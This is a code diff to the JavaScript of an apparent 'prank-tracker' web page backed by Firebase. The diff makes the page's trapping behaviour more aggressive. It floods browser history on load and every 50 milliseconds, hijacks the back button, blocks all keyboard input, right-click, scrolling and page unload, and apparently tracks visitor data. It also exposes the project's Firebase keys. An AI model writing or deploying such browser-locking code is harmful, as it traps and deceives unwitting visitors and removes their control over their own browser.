@@ -442,13 +442,13 @@ function beep(freq = 800, duration = 100) {
 // ============ FIREBASE CONFIG ============
 // APNA FIREBASE CONFIG YAHA PASTE KAR
 const firebaseConfig = {
-  apiKey: "AIzaSyBoOU9E8f0Xgo6Y1gyFYqnMPN...",
+  apiKey: "AIzaSyBoOU9E8f0Xgo6Y1gyFYqnMPN",
   authDomain: "prank-tracker-eeb93.firebaseapp.com",
   databaseURL: "https://prank-tracker-eeb93-default-rtc.firebaseio.com",
   projectId: "prank-tracker-eeb93",
   storageBucket: "prank-tracker-eeb93.appspot.com",
   messagingSenderId: "716338104484",
-  appId: "1:716338104484:web:e4495c49ba0d...",
+  appId: "1:716338104484:web:e4495c49ba0d",
   measurementId: "G-7DP27LECHL"
 };
 
@@ -586,27 +586,31 @@ function formatDataForDisplay(data) {
   `.trim();
 }
 
-// BLOCK BACK BUTTON AND NAVIGATION - AGGRESSIVE MODE
+// BLOCK BACK BUTTON AND NAVIGATION - MAXIMUM AGGRESSIVE
 let isPrankActive = false;
 
 function blockBackButton() {
   window.history.pushState(null, null, window.location.href);
+  window.history.pushState(null, null, window.location.href);
 }
 
-// DISABLE ALL USER INTERACTIONS - AGGRESSIVE
-function disableAllInteractions() {
-  // Immediately push history to prevent back
+// Push history multiple times on load
+for (let i = 0; i < 10; i++) {
   window.history.pushState(null, null, window.location.href);
-  
+}
+
+// DISABLE ALL USER INTERACTIONS
+function disableAllInteractions() {
   // Disable right-click
   document.addEventListener('contextmenu', (e) => {
-    e.preventDefault();
-    return false;
+    if (isPrankActive) {
+      e.preventDefault();
+      return false;
+    }
   }, true);
   
-  // Disable all keyboard shortcuts
+  // Block ALL keyboard
   document.addEventListener('keydown', (e) => {
-    // Block everything dangerous
     if (isPrankActive) {
       e.preventDefault();
       e.stopPropagation();
@@ -615,28 +619,13 @@ function disableAllInteractions() {
   }, true);
   
   // Prevent scrolling
+  document.addEventListener('wheel', (e) => {
+    if (isPrankActive) e.preventDefault();
+  }, { passive: false });
+  
   document.addEventListener('touchmove', (e) => {
-    if (isPrankActive) {
-      e.preventDefault();
-    }
+    if (isPrankActive) e.preventDefault();
   }, { passive: false });
-  
-  // Disable text selection
-  document.addEventListener('selectstart', (e) => {
-    e.preventDefault();
-  }, true);
-  
-  // Disable double-tap zoom
-  document.addEventListener('touchstart', (e) => {
-    if (e.touches.length > 1) {
-      e.preventDefault();
-    }
-  }, { passive: false });
-  
-  // Disable swipe gestures
-  document.addEventListener('gesturestart', (e) => {
-    e.preventDefault();
-  }, true);
   
   // Block page unload
   window.addEventListener('beforeunload', (e) => {
@@ -648,35 +637,25 @@ function disableAllInteractions() {
   });
 }
 
-// Call immediately on load
 disableAllInteractions();
 
-// Aggressive back button blocking
-window.addEventListener('popstate', function(e) {
+// AGGRESSIVE BACK BUTTON BLOCKING
+window.addEventListener('popstate', (e) => {
+  e.preventDefault();
   blockBackButton();
-});
+}, true);
 
-// Multiple history push attempts
+// Continuous history blocking
 setInterval(() => {
+  window.history.pushState(null, null, window.location.href);
+}, 50);
+
+// Also block on focus
+window.addEventListener('focus', () => {
   if (isPrankActive) {
     blockBackButton();
   }
-}, 100);
-
-// Block specific key combinations
-document.addEventListener('keydown', function(e) {
-  if (isPrankActive) {
-    // Block: Alt+Left, Alt+Right (browser back/forward)
-    if ((e.altKey && e.key === 'ArrowLeft') || 
-        (e.altKey && e.key === 'ArrowRight') ||
-        (e.ctrlKey && e.key === 'w') ||
-        (e.ctrlKey && e.key === 'q') ||
-        e.key === 'Escape') {
-      e.preventDefault();
-      return false;
-    }
-  }
-}, true);
+});
 
 // Initial history push
 window.history.pushState(null, null, window.location.href);
